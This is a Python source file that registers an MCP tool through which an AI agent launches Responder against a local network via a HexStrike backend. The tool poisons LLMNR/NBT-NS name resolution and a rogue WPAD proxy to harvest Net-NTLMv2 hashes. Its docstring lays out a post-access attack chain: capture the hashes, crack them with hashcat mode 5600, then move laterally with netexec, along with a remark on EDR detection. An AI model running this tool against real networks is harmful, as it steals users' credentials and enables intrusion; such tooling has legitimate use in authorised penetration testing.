# mcp_tools/credential_harvest/responder.py

from typing import Dict, Any
import asyncio
from fastmcp import Context

def register_responder_tool(mcp, hexstrike_client, logger=None):

    @mcp.tool()
    async def responder_credential_harvest(
        ctx: Context,
        interface: str = "eth0",
        analyze: bool = False,
        wpad: bool = True,
        force_wpad_auth: bool = False,
        fingerprint: bool = False,
        duration: int = 300,
        additional_args: str = ""
    ) -> Dict[str, Any]:
        """
        Network credential harvesting via LLMNR/NBT-NS poisoning using Responder.

        Workflow: run on internal network after initial access to harvest NTLM hashes.
        Captured Net-NTLMv2 hashes → hashcat -m 5600 → netexec lateral movement.

        Parameters:
        - interface: network interface (e.g. 'eth0', 'tun0')
        - analyze: passive mode only — no poisoning, safe recon
        - wpad: enable WPAD rogue proxy (captures browser proxy auth)
        - force_wpad_auth: force WPAD auth challenge (more aggressive)
        - fingerprint: OS fingerprinting mode
        - duration: seconds to run (default 300)
        - additional_args: extra Responder flags (-v, --lm)

        Prerequisites: same network segment as targets, root/sudo required.
        ⚠️ Noisy — detected by modern EDR. Use analyze=True first.

        Post-capture: hashes saved to /usr/share/responder/logs/
        hashcat_crack(hash_file='NTLMv2-*.txt', hash_type='5600', ...)
        """
        data = {
            "interface": interface,
            "analyze": analyze,
            "wpad": wpad,
            "force_wpad_auth": force_wpad_auth,
            "fingerprint": fingerprint,
            "duration": duration,
            "additional_args": additional_args
        }
        mode = "analyze" if analyze else "poisoning"
        await ctx.info(f"🔍 Starting Responder [{mode}] on {interface} for {duration}s")
        await ctx.report_progress(0, 100)

        loop = asyncio.get_running_loop()
        future = loop.run_in_executor(
            None, lambda: hexstrike_client.safe_post("api/tools/responder", data)
        )

        phases = [
            (15, "🔌 Starting Responder listeners..."),
            (40, "🎣 Poisoning LLMNR/NBT-NS..."),
            (70, "🔑 Waiting for credential captures..."),
            (88, "📋 Processing captured hashes..."),
        ]
        for progress, message in phases:
            done, _ = await asyncio.wait([future], timeout=20)
            if done:
                break
            await ctx.report_progress(progress, 100)
            await ctx.info(message)

        result = await future
        await ctx.report_progress(100, 100)

        if result.get("success"):
            await ctx.info("✅ Completed successfully")
            await ctx.info("💡 Check Responder logs for captured credentials")
        else:
            await ctx.error(f"❌ Failed: {result.get('error', 'unknown')}")
        return result
